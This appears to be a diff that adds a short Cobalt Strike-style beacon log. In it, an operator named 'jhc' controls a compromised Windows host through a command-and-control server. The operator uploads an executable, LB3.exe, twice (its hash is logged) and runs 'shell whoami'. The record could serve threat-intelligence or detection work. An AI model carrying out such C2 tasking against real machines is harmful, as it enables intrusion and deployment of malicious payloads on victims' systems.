@@ -1,0 +1,11 @@
+12/11 10:18:22 UTC [metadata] 60.251.221.27 <- 192.168.195.129; computer: DESKTOP-Q69T4D6; user: OwO *; process: WPEXPLOIT.exe; pid: 3596; os: Windows; version: 6.2; build: 9200; beacon arch: x64 (x64)
+12/11 10:22:29 UTC [checkin] host called home, sent: 19 bytes
+12/11 10:22:37 UTC [checkin] host called home, sent: 44 bytes
+12/11 10:22:58 UTC [input] <jhc> upload /home/jhc/Downloads/LB3.exe (C:\Users\OwO\Desktop\Tools\LB3.exe)
+12/11 10:22:58 UTC [task] <> Tasked beacon to upload /home/jhc/Downloads/LB3.exe as C:\Users\OwO\Desktop\Tools\LB3.exe
+12/11 10:22:58 UTC [indicator] file: b9ce9c15793ec92ae6cdbdb3d73f9047 157184 bytes C:\Users\OwO\Desktop\Tools\LB3.exe
+12/11 10:23:22 UTC [input] <jhc> upload /home/jhc/Downloads/LB3.exe (C:\Users\OwO\Desktop\LB3.exe)
+12/11 10:23:22 UTC [task] <> Tasked beacon to upload /home/jhc/Downloads/LB3.exe as C:\Users\OwO\Desktop\LB3.exe
+12/11 10:23:23 UTC [indicator] file: b9ce9c15793ec92ae6cdbdb3d73f9047 157184 bytes C:\Users\OwO\Desktop\LB3.exe
+12/11 10:52:51 UTC [input] <jhc> shell whoami
+12/11 10:52:51 UTC [task] <T1059> Tasked beacon to run: whoami
